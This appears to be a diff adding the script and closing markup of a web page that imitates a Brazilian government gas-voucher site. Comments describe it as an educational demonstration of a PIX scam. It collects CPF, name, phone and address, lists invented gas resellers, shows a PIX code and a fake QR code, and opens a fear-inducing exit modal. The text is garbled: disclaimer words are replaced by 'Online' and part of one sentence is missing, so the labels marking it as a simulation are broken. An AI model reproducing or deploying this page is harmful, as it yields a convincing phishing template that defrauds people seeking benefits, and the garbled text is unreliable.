+                </div>
+            </div>
+            <button type="button" class="br-button primary w-100 mt-2" onclick="fecharModalSaidaEIrParaPix()">
+                Regularizar agora
+            </button>
+            <button type="button" class="br-button secondary w-100 mt-2" onclick="fecharModalSaida()" style="background:#333; color:#fff;">
+                Não, estou ciente de que é uma Online
+            </button>
+        </div>
+    </div>
+
+<script>
+
+function setLoading(btn, isLoading, loadingText) {
+    if (isLoading) {
+        btn.dataset.originalLabel = btn.innerHTML;
+        btn.disabled = true;
+        btn.setAttribute('aria-busy', 'true');
+        btn.innerHTML = '<span class="spinner" aria-hidden="true"></span> ' + loadingText;
+    } else {
+        btn.disabled = false;
+        btn.removeAttribute('aria-busy');
+        btn.innerHTML = btn.dataset.originalLabel || btn.innerHTML;
+    }
+}
+
+function mostrarCaixa(id) {
+    const el = document.getElementById(id);
+    if (el) {
+        el.classList.add('visivel');
+        el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+}
+
+function ocultarCaixa(id) {
+    const el = document.getElementById(id);
+    if (el) el.classList.remove('visivel');
+}
+
+// ---------------------------------------------------------------------
+// 1) CONSULTA Online DE CPF
+// ---------------------------------------------------------------------
+function validarCPF(cpf) {
+    cpf = cpf.replace(/\D/g, '');
+    if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
+    let soma = 0;
+    for (let i = 0; i < 9; i++) soma += Number.parseInt(cpf.charAt(i)) * (10 - i);
+    let digito1 = 11 - (soma % 11);
+    if (digito1 >= 10) digito1 = 0;
+    if (digito1 !== Number.parseInt(cpf.charAt(9))) return false;
+    soma = 0;
+    for (let i = 0; i < 10; i++) soma += Number.parseInt(cpf.charAt(i)) * (11 - i);
+    let digito2 = 11 - (soma % 11);
+    if (digito2 >= 10) digito2 = 0;
+    return digito2 === Number.parseInt(cpf.charAt(10));
+}
+
+function mostrarErro(input, mensagem) {
+    let errorDiv = document.getElementById('cpf-error');
+    if (errorDiv) errorDiv.remove();
+    const successDiv = document.getElementById('cpf-success');
+    if (successDiv) successDiv.remove();
+    input.classList.remove('is-valid');
+    input.classList.add('is-invalid');
+    input.setAttribute('aria-invalid', 'true');
+    const msg = document.createElement('div');
+    msg.id = 'cpf-error';
+    msg.className = 'error-message';
+    msg.setAttribute('role', 'alert');
+    msg.innerHTML = '<i class="fas fa-exclamation-triangle" aria-hidden="true"></i> ' + mensagem;
+    input.parentNode.appendChild(msg);
+}
+
+function limparErro(input) {
+    const errorDiv = document.getElementById('cpf-error');
+    if (errorDiv) errorDiv.remove();
+    const successDiv = document.getElementById('cpf-success');
+    if (successDiv) successDiv.remove();
+    input.classList.remove('is-invalid', 'is-valid');
+    input.removeAttribute('aria-invalid');
+}
+
+function mostrarSucesso(input) {
+    limparErro(input);
+    input.classList.add('is-valid');
+    const successDiv = document.createElement('div');
+    successDiv.id = 'cpf-success';
+    successDiv.className = 'success-message';
+    successDiv.innerHTML = '<i class="fas fa-check-circle" aria-hidden="true"></i> CPF válido';
+    input.parentNode.appendChild(successDiv);
+}
+
+// ---------------------------------------------------------------------
+// 2) REVENDAS OnlineS CONFORME CEP
+// ---------------------------------------------------------------------
+const precosSimulacao = [97.0, 98.0, 99.0, 101.0, 104.0, 106.0];
+const ruasSimulacao = ['Rua das Acácias', 'Av. Brasil', 'Rua do Comércio', 'Rua São João', 'Av. Central', 'Rua das Flores'];
+
+// --- DADOS SIMULADOS DE LOCALIZAÇÃO (nenhuma chamada de API) ---
+const municipiosMock = {
+    AC: ['Rio Branco', 'Cruzeiro do Sul', 'Sena Madureira'],
+    AL: ['Maceió', 'Arapiraca', 'Palmeira dos Índios'],
+    AP: ['Macapá', 'Santana', 'Laranjal do Jari'],
+    AM: ['Manaus', 'Parintins', 'Itacoatiara'],
+    BA: ['Salvador', 'Feira de Santana', 'Vitória da Conquista'],
+    CE: ['Fortaleza', 'Caucaia', 'Juazeiro do Norte'],
+    DF: ['Brasília', 'Taguatinga', 'Ceilândia'],
+    ES: ['Vitória', 'Vila Velha', 'Serra'],
+    GO: ['Goiânia', 'Aparecida de Goiânia', 'Anápolis'],
+    MA: ['São Luís', 'Imperatriz', 'Caxias'],
+    MT: ['Cuiabá', 'Várzea Grande', 'Rondonópolis'],
+    MS: ['Campo Grande', 'Dourados', 'Três Lagoas'],
+    MG: ['Belo Horizonte', 'Uberlândia', 'Contagem'],
+    PA: ['Belém', 'Ananindeua', 'Santarém'],
+    PB: ['João Pessoa', 'Campina Grande', 'Santa Rita'],
+    PR: ['Curitiba', 'Londrina', 'Maringá'],
+    PE: ['Recife', 'Olinda', 'Caruaru'],
+    PI: ['Teresina', 'Parnaíba', 'Picos'],
+    RJ: ['Rio de Janeiro', 'Niterói', 'Nova Iguaçu'],
+    RN: ['Natal', 'Mossoró', 'Parnamirim'],
+    RS: ['Porto Alegre', 'Caxias do Sul', 'Pelotas'],
+    RO: ['Porto Velho', 'Ji-Paraná', 'Ariquemes'],
+    RR: ['Boa Vista', 'Rorainópolis', 'Caracaraí'],
+    SC: ['Florianópolis', 'Joinville', 'Blumenau'],
+    SP: ['São Paulo', 'Campinas', 'Guarulhos'],
+    SE: ['Aracaju', 'Nossa Senhora do Socorro', 'Itabaiana'],
+    TO: ['Palmas', 'Araguaína', 'Gurupi']
+};
+
+const bairrosMock = ['Centro', 'Jardim América', 'Vila Nova', 'Santa Cruz', 'Boa Vista', 'Industrial', 'São José', 'Cidade Nova'];
+
+function carregarMunicipiosHome() {
+    const uf = document.getElementById('home_uf').value;
+    const munSelect = document.getElementById('home_municipio');
+    const bairroSelect = document.getElementById('home_bairro');
+    const cepInput = document.getElementById('home_cep');
+
+    if (uf) cepInput.value = '';
+
+    bairroSelect.innerHTML = '<option value="">Todos</option>';
+    bairroSelect.disabled = true;
+
+    if (!uf) {
+        munSelect.innerHTML = '<option value="">Selecione UF...</option>';
+        munSelect.disabled = true;
+        return;
+    }
+
+    const cidades = municipiosMock[uf] || ['Cidade 1', 'Cidade 2', 'Cidade 3'];
+    munSelect.innerHTML = '<option value="">Selecione...</option>';
+    cidades.forEach(function (cidade) {
+        const opt = document.createElement('option');
+        opt.value = cidade;
+        opt.text = cidade;
+        munSelect.add(opt);
+    });
+    munSelect.disabled = false;
+}
+
+function carregarBairrosHome() {
+    const mun = document.getElementById('home_municipio').value;
+    const bairroSelect = document.getElementById('home_bairro');
+
+    if (!mun) {
+        bairroSelect.innerHTML = '<option value="">Todos</option>';
+        bairroSelect.disabled = true;
+        return;
+    }
+
+    bairroSelect.innerHTML = '<option value="">Todos</option>';
+    bairrosMock.forEach(function (b) {
+        const opt = document.createElement('option');
+        opt.value = b;
+        opt.text = b;
+        bairroSelect.add(opt);
+    });
+    bairroSelect.disabled = false;
+}
+
+function hashNumero(texto) {
+    let h = 0;
+    for (let i = 0; i < texto.length; i++) h = (h * 31 + texto.charCodeAt(i)) >>> 0;
+    return h;
+}
+
+// Consulta o endereço real de um CEP via ViaCEP (API pública gratuita).
+// Se falhar (offline etc.), a Online usa um bairro de fallback.
+function buscarEnderecoPorCep(cep) {
+    return fetch('https://viacep.com.br/ws/' + cep.replace(/\D/g, '') + '/json/')
+        .then(function (res) { return res.ok ? res.json() : null; })
+        .then(function (dados) {
+            if (!dados || dados.erro) return null;
+            return dados;
+        })
+        .catch(function () { return null; });
+}
+
+const ruasComuns = [
+    '15 de Novembro',
+    'Getúlio Vargas',
+    'das Palmeiras',
+    'Marechal Deodoro',
+    'dos Ipês',
+    'das Laranjeiras'
+];
+
+function gerarRevendas(chave, endereco, loc) {
+    const seed = hashNumero(chave);
+    const baseRua = (endereco && endereco.logradouro) || null;
+    const bairro = (endereco && endereco.bairro) || (loc && loc.bairro) || bairrosMock[seed % bairrosMock.length];
+    const cidade = (endereco && endereco.localidade) || (loc && loc.municipio) || 'Cidade';
+    const uf = (endereco && endereco.uf) || (loc && loc.uf) || 'BR';
+
+    // A 1ª revenda fica na própria rua do CEP; as demais em ruas próximas do mesmo bairro
+    const tipos = ['Rua', 'Av.', 'Travessa', 'Rua', 'Av.', 'Praça'];
+    const ruas = ruasComuns.map(function (nome, i) {
+        if (baseRua && i === 0) return baseRua;
+        if (baseRua && i === 1) return 'Travessa ' + nome;
+        return tipos[i] + ' ' + nome;
+    });
+
+    return precosSimulacao.map((preco, i) => ({
+        nome: ['Gás Luz Revendas', 'Brasil Gás Distribuidora', 'Revenda Central do Gás', 'Gás Popular Ltda', 'Posto Chama Viva', 'Gás & Cia'][i],
+        rua: ruas[i],
+        numero: String(100 + ((seed >> (i * 4)) & 0x3FF) % 900),
+        bairro: bairro,
+        cidade: cidade,
+        uf: uf,
+        preco: preco,
+        destaque: i === 0,
+        incluiCesta: i === 0
+    }));
+}
+
+function mostrarRevendas(chave, endereco, loc) {
+    const grid = document.getElementById('revendaCards');
+    const revendas = gerarRevendas(chave, endereco, loc);
+
+    const digitos = chave.replace(/\D/g, '');
+    const cepExibicao = digitos.length === 8
+        ? digitos.slice(0, 5) + '-' + digitos.slice(5)
+        : String(10000 + (hashNumero(chave) % 89999)) + '-000';
+
+    grid.innerHTML = '';
+
+    revendas.forEach((r, idx) => {
+        const card = document.createElement('div');
+        card.className = 'revenda-card' + (r.destaque ? ' destaque' : '');
+
+        let extra = '';
+        if (r.incluiCesta) {
+            extra = '<span class="tag-vantagem">Mais vantagem</span>' +
+                    '<div class="revenda-extra"><i class="fas fa-shopping-basket" aria-hidden="true"></i> Inclui 1 vale gás + cesta básica digital</div>';
+        }
+
+        card.innerHTML =
+            extra +
+            '<div class="revenda-nome"><i class="fas fa-gas-pump" aria-hidden="true"></i> ' + r.nome + '</div>' +
+            '<div class="revenda-endereco"><i class="fas fa-map-marker-alt" aria-hidden="true"></i> ' + r.rua + ', ' + r.numero +
+            ' - ' + r.bairro + ', ' + r.cidade + '/' + r.uf +
+            ' - CEP ' + cepExibicao + ' (Online)</div>' +
+            '<div class="revenda-preco"><span class="moeda">R$</span><span class="valor">' + r.preco.toFixed(2).replace('.', ',') + '</span></div>' +
+            '<button type="button" class="br-button ' + (r.destaque ? 'primary' : 'secondary') + '" data-indice="' + idx + '">Selecionar</button>';
+
+        grid.appendChild(card);
+    });
+
+    grid.querySelectorAll('button[data-indice]').forEach(function (btn) {
+        btn.addEventListener('click', function () {
+            abrirReserva(revendas[Number(btn.dataset.indice)]);
+        });
+    });
+
+    mostrarCaixa('resultadoRevendas');
+}
+
+// ---------------------------------------------------------------------
+// 3) RESERVA Online -> PIX 
+// ---------------------------------------------------------------------
+let reservaAtual = null;
+
+function abrirReserva(revenda) {
+    reservaAtual = revenda;
+    document.getElementById('pagamentoPreco').textContent = 'R$ ' + revenda.preco.toFixed(2).replace('.', ',');
+    ocultarCaixa('pixSection');
+    document.getElementById('reservaForm').reset();
+    mostrarCaixa('pagamentoSection');
+}
+
+function gerarPixFicticio(valor, nome, cpf) {
+    // Chave claramente Online ("demo-") -> NUNCA cobrável
+    const chave = 'demo-' + cpf.replace(/\D/g, '');
+    const gui = 'BR.GOV.BCB.PIX';
+    const campoChave = '0014' + gui + '01' + chave;
+    const payload =
+        '00020126' + String(campoChave.length).padStart(2, '0') + campoChave +
+        '520400005303986' + '5406' + valor.toFixed(2) +
+        '5802BR59' + String(nome.length).padStart(2, '0') + nome.toUpperCase() +
+        '6009SAO PAULO';
+
+    let crc = 0xFFFF;
+    for (let i = 0; i < payload.length; i++) {
+        crc ^= payload.charCodeAt(i);
+        for (let b = 0; b < 8; b++) {
+            crc = (crc & 1) ? ((crc >>> 1) ^ 0x8402) & 0xFFFF : (crc >>> 1) & 0xFFFF;
+        }
+    }
+    return payload + '6304' + crc.toString(16).toUpperCase().padStart(4, '0');
+}
+
+function desenharQrFicticio(seed) {
+    const canvas = document.getElementById('pixCanvas');
+    const ctx = canvas.getContext('2d');
+    const size = 21;
+    const cell = Math.floor(180 / (size + 4));
+    const off = Math.floor((180 - cell * size) / 2);
+
+    let h = hashNumero(seed);
+    const rand = function () {
+        h = (h * 1664525 + 1013904223) >>> 0;
+        return h / 4294967296;
+    };
+
+    const matrix = [];
+    for (let y = 0; y < size; y++) {
+        matrix.push([]);
+        for (let x = 0; x < size; x++) matrix[y].push(rand() > 0.52);
+    }
+
+    const finder = function (r, c) {
+        for (let y = 0; y < 7; y++) {
+            for (let x = 0; x < 7; x++) {
+                const ring = Math.max(Math.abs(x - 3), Math.abs(y - 3));
+                matrix[r + y][c + x] = ring !== 2;
+            }
+        }
+    };
+    finder(0, 0);
+    finder(0, size - 7);
+    finder(size - 7, 0);
+
+    ctx.fillStyle = '#FFFFFF';
+    ctx.fillRect(0, 0, 180, 180);
+    ctx.fillStyle = '#000000';
+    for (let y = 0; y < size; y++) {
+        for (let x = 0; x < size; x++) {
+            if (matrix[y][x]) ctx.fillRect(off + x * cell, off + y * cell, cell, cell);
+        }
+    }
+}
+
+function copiarPix() {
+    const code = document.getElementById('pixCode').textContent;
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(code).then(function () {
+            const btn = document.querySelector('.btn-copiar');
+            const antigo = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-check" aria-hidden="true"></i> Copiado (código )';
+            setTimeout(function () { btn.innerHTML = antigo; }, 2000);
+        });
+    }
+}
+
+// ---------------------------------------------------------------------
+// 4) MODAL DE SAÍDA (simula a tática de medo do golpe)
+// ---------------------------------------------------------------------
+let modalMostrado = false;
+
+function mostrarModalSaida() {
+    if (modalMostrado) return;
+    modalMostrado = true;
+    document.getElementById('exitModal').classList.add('visivel');
+}
+
+function fecharModalSaida() {
+    document.getElementById('exitModal').classList.remove('visivel');
+}
+
+function fecharModalSaidaEIrParaPix() {
+    fecharModalSaida();
+    // Em golpes reais, esta ação redireciona a vítima para o PIX do criminoso.
+    // Na Online, apenas rola até a seção de PIX  já exibida.
+    if (reservaAtual) {
+        mostrarCaixa('pixSection');
+    } else {
+        document.getElementById('pixSection').scrollIntoView({ behavior: 'smooth' });
+    }
+}
+
+document.addEventListener('mouseout', function (e) {
+    if (!e.relatedTarget && e.clientY <= 0) mostrarModalSaida();
+});
+
+// ---------------------------------------------------------------------
+// MÁSCARAS E VALIDAÇÕES
+// ---------------------------------------------------------------------
+function mascaraCepHome(input) {
+    let value = input.value.replace(/\D/g, '');
+    if (value.length > 5) {
+        value = value.replace(/^(\d{5})(\d)/, '$1-$2');
+    }
+    input.value = value;
+
+    const cepError = document.getElementById('cep-error-home');
+    if (value.length > 0) {
+        cepError.style.display = 'none';
+        document.getElementById('home_uf').value = '';
+        document.getElementById('home_municipio').innerHTML = '<option value="">Selecione UF...</option>';
+        document.getElementById('home_municipio').disabled = true;
+        document.getElementById('home_bairro').innerHTML = '<option value="">Todos</option>';
+        document.getElementById('home_bairro').disabled = true;
+    }
+}
+
+function mascaraCpfReserva(input) {
+    let v = input.value.replace(/\D/g, '');
+    if (v.length > 11) v = v.slice(0, 11);
+    v = v.replace(/(\d{3})(\d)/, '$1.$2');
+    v = v.replace(/(\d{3})(\d)/, '$1.$2');
+    v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+    input.value = v;
+}
+
+function validarCpfReserva(input) {
+    mascaraCpfReserva(input);
+    const v = input.value.replace(/\D/g, '');
+    if (v.length < 11) {
+        limparErro(input);
+    } else if (validarCPF(v)) {
+        mostrarSucesso(input);
+    } else {
+        mostrarErro(input, 'CPF inválido');
+    }
+}
+
+function mascaraTelReserva(input) {
+    let v = input.value.replace(/\D/g, '');
+    if (v.length > 11) v = v.slice(0, 11);
+    v = v.replace(/(\d{2})(\d)/, '($1) $2');
+    if (v.length > 10) {
+        v = v.replace(/(\(\d{2}\) \d{5})(\d)/, '$1-$2');
+    } else {
+        v = v.replace(/(\(\d{2}\) \d{4})(\d)/, '$1-$2');
+    }
+    input.value = v;
+}
+
+function mostrarErroRevendas(mensagem) {
+    const box = document.getElementById('revendaErrorBox');
+    const text = document.getElementById('revendaErrorText');
+    text.textContent = mensagem;
+    box.style.display = 'flex';
+    box.scrollIntoView({ behavior: 'smooth', block: 'center' });
+}
+
+function esconderErroRevendas() {
+    document.getElementById('revendaErrorBox').style.display = 'none';
+}
+
+// ---------------------------------------------------------------------
+// EVENTOS
+// ---------------------------------------------------------------------
+window.addEventListener('load', function () {
+    const cpfInput = document.getElementById('cpf');
+    const form = document.getElementById('consultaForm');
+    const btnConsultar = document.getElementById('btnConsultar');
+
+    if (cpfInput && form) {
+        cpfInput.addEventListener('input', function (e) {
+            let v = e.target.value.replace(/\D/g, '');
+            v = v.replace(/(\d{3})(\d)/, '$1.$2');
+            v = v.replace(/(\d{3})(\d)/, '$1.$2');
+            v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+            e.target.value = v;
+
+            const cpfLimpo = v.replace(/\D/g, '');
+            if (cpfLimpo.length < 11) {
+                limparErro(e.target);
+            } else if (cpfLimpo.length === 11) {
+                if (validarCPF(cpfLimpo)) {
+                    mostrarSucesso(e.target);
+                } else {
+                    mostrarErro(e.target, 'CPF inválido');
+                }
+            }
+        });
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+            const cpf = cpfInput.value.replace(/\D/g, '');
+            if (cpf.length !== 11) {
+                mostrarErro(cpfInput, 'Digite um CPF com 11 dígitos');
+                cpfInput.focus();
+                return false;
+            }
+            if (!validarCPF(cpf)) {
+                mostrarErro(cpfInput, 'CPF inválido');
+                cpfInput.focus();
+                return false;
+            }
+            setLoading(btnConsultar, true, 'Consultando...');
+            setTimeout(function () {
+                setLoading(btnConsultar, false, 'Consultar Benefício (simular)');
+                mostrarCaixa('resultadoConsulta');
+            }, 800);
+        });
+    }
+
+    // Formulário de revendas
+    const revendaForm = document.getElementById('formRevendasHome');
+    if (revendaForm) {
+        revendaForm.addEventListener('submit', async function (e) {
+            e.preventDefault();
+            const uf = document.getElementById('home_uf').value;
+            const municipio = document.getElementById('home_municipio').value;
+            const bairro = document.getElementById('home_bairro').value;
+            const cep = document.getElementById('home_cep').value;
+            const cepError = document.getElementById('cep-error-home');
+            const btnRevendas = document.getElementById('btnBuscarRevendas');
+
+            esconderErroRevendas();
+            cepError.style.display = 'none';
+
+            if (cep.length > 0) {
+                const cepDigitos = cep.replace(/\D/g, '');
+                if (cepDigitos.length !== 8) {
+                    cepError.style.display = 'block';
+                    document.getElementById('home_cep').focus();
+                    return false;
+                }
+                setLoading(btnRevendas, true, 'Buscando...');
+                const endereco = await buscarEnderecoPorCep(cep);
+                setTimeout(function () {
+                    setLoading(btnRevendas, false, 'Buscar Revendas (simular)');
+                    mostrarRevendas(cep, endereco);
+                }, 400);
+                return;
+            }
+
+            if (!uf || !municipio) {
+                mostrarErroRevendas('Selecione um Estado e Município OU digite um CEP para buscar as revendas.');
+                return false;
+            }
+
+            setLoading(btnRevendas, true, 'Buscando...');
+            setTimeout(function () {
+                setLoading(btnRevendas, false, 'Buscar Revendas (simular)');
+                mostrarRevendas(uf + municipio + bairro, null, { uf: uf, municipio: municipio, bairro: bairro });
+            }, 400);
+        });
+
+        ['home_uf', 'home_municipio', 'home_cep'].forEach(function (id) {
+            document.getElementById(id).addEventListener('change', esconderErroRevendas);
+        });
+    }
+
+    // Formulário de reserva -> gera PIX 
+    const reservaForm = document.getElementById('reservaForm');
+    if (reservaForm) {
+        reservaForm.addEventListener('submit', function (e) {
+            e.preventDefault();
+            const nome = document.getElementById('reservaNome').value.trim();
+            const cpf = document.getElementById('reservaCpf').value.replace(/\D/g, '');
+            const tel = document.getElementById('reservaTel').value.trim();
+            const rua = document.getElementById('reservaRua').value.trim();
+            const numero = document.getElementById('reservaNumero').value.trim();
+
+            if (nome.length < 3) {
+                alert('Online: informe um nome de exemplo.');
+                return;
+            }
+            if (cpf.length !== 11) {
+                alert('Online: informe um CPF de exemplo (11 dígitos).');
+                return;
+            }
+            if (tel.length < 8) {
+                alert('Online: informe um telefone de exemplo.');
+                return;
+            }
+            if (rua.length < 3 || numero.length === 0) {
+                alert('Online: informe o nome da rua e o número da casa.');
+                return;
+            }
+
+            const valor = reservaAtual ? reservaAtual.preco : 97.0;
+            const pix = gerarPixFicticio(valor, nome, cpf);
+            document.getElementById('pixCode').textContent = pix;
+            desenharQrFicticio(pix);
+            ocultarCaixa('pagamentoSection');
+            mostrarCaixa('pixSection');
+        });
+    }
+});
+
+// ---------------------------------------------------------------------
+// ---------------------------------------------------------------------
+console.log('%c⚠ Online Online ⚠', 'background:#E52207;color:#fff;font-size:16px;padding:6px;');
+console.log('Esta página é uma demonstração educativa de golpes. , pagamento ou PIX é real. Os dados digitados ficam apenas neste navegador.');
+</script>
+
+<script>
+document.getElementById('consultaForm').addEventListener('submit', function () {
+    gtag('event', 'consulta_iniciada', { 'event_category': 'consulta', 'value': 1 });
+});
+</script>
+
+
+
+
+</body></html>
